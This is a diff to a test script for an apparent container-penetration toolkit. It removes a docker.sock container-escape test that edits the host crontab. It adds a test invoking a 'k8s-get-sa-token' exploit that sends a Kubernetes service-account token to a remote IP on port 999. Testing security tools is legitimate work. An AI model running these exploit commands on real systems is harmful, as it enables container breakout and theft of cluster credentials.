@@ -742,21 +742,15 @@ def test_auto_pwn():
     # clear the crontab
     check_host_exec(r'cp -f /etc/crontab_bak /etc/crontab', [], ['cp'], False)
 
-def test_dev():
 
-    # 3. docker.sock
-    inside_container_cmd(
-        image='ubuntu:latest',
-        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
-        cmd=r'auto-escape \"touch /tmp/auto-docker-sock\"',  # " needs to escape in raw
-        white_list=['all exploits are finished, auto exploit success!'],
-        black_list=['i@cdxy.me', 'OCI '],
-        verbose=False
+def test_dev():
+    # exploit: k8s-get-sa-token (with remote ip listening port)
+    check_pod_exec(
+        'run k8s-get-sa-token default admin 39.104.80.49 999',
+        [''],
+        ['i@cdxy.me', 'cdk evaluate'],
+        True
     )
-    time.sleep(1)
-    check_host_exec(r'cat /etc/crontab', ['CDK auto exploit via docker.sock'], [], False)
-    # clear the crontab
-    check_host_exec(r'cp -f /etc/crontab_bak /etc/crontab', [], ['cp'], False)
 
 
 if __name__ == '__main__':
@@ -775,9 +769,9 @@ if __name__ == '__main__':
     print('-' * 10, 'upload all done', '-' * 10)
 
     # test
-    # test_dev()
+    test_dev()
 
-    test_auto_pwn()
-    test_container()
-    test_pod()
-    clear_all_env()
+    # test_auto_pwn()
+    # test_container()
+    # test_pod()
+    # clear_all_env()
